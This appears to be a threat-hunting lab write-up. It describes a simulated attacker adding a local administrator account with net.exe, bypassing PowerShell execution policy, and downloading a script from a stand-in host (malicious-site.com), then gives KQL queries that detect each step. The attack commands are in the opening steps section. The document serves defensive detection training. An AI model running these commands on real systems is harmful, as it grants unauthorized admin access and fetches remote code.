# ⚠️ Threat Event: Unauthorized Local Admin Account Creation

**Suspicious Local Admin Account Created Using `net.exe` and PowerShell**

---

## 🧪 Steps the "Bad Actor" Took to Create Logs and IoCs

1. **Used `net.exe` or `net1.exe` to add a new user to the local Administrators group:**
   ```bash
   net localgroup administrators attackerUser /add
   ```

2. **Launched PowerShell with execution policy bypass:**
   ```bash
   powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "..."
   ```

3. **Downloaded a remote script (possibly for persistence):**
   ```bash
   powershell -Command "Invoke-WebRequest -Uri http://malicious-site.com/script.ps1 -OutFile C:\temp\script.ps1"
   ```

4. **Executed the downloaded script using bypassed policies.**

---

## 📊 Tables Used to Detect IoCs

| Parameter | Description |
|----------|-------------|
| **Name** | `DeviceProcessEvents` |
| **Info** | [Microsoft Docs: DeviceProcessEvents](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table) |
| **Purpose** | Used to detect the use of `net.exe` or PowerShell with execution policy bypass |

| Parameter | Description |
|----------|-------------|
| **Name** | `DeviceNetworkEvents` |
| **Info** | [Microsoft Docs: DeviceNetworkEvents](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table) |
| **Purpose** | Used to detect PowerShell-initiated downloads from external sources (`.ps1` scripts) |

---

## 🧠 Related Queries (KQL)

### 🔍 Detect Unauthorized Admin Account Creation
```kql
DeviceProcessEvents
| where FileName in~ ("net.exe", "net1.exe")
| where ProcessCommandLine has_all ("localgroup", "administrators", "add")
```

### 🔍 Detect PowerShell Execution Policy Bypass
```kql
DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has "-ExecutionPolicy Bypass"
```

### 🔍 Detect PowerShell Downloading External Scripts
```kql
DeviceNetworkEvents
| where RemoteUrl endswith ".ps1"
| where InitiatingProcessFileName =~ "powershell.exe"
```

---

## 👤 Created By

- **Author Name:** Ben  
- **Author Contact:** [LinkedIn/GitHub if desired]  
- **Date:** April 13, 2025  

---

## ✅ Validated By

- **Reviewer Name:**  
- **Reviewer Contact:**  
- **Validation Date:**  

---

## 📝 Additional Notes

- Consider expanding this into a detection lab for junior analysts  
- Use simulated attack tools like [Nishang](https://github.com/samratashok/nishang) for more PowerShell-based attack scenarios  

---

## 🗂️ Revision History

| Version | Changes       | Date           | Modified By |
|---------|---------------|----------------|-------------|
| 1.0     | Initial draft | April 13, 2025 | Ben         |
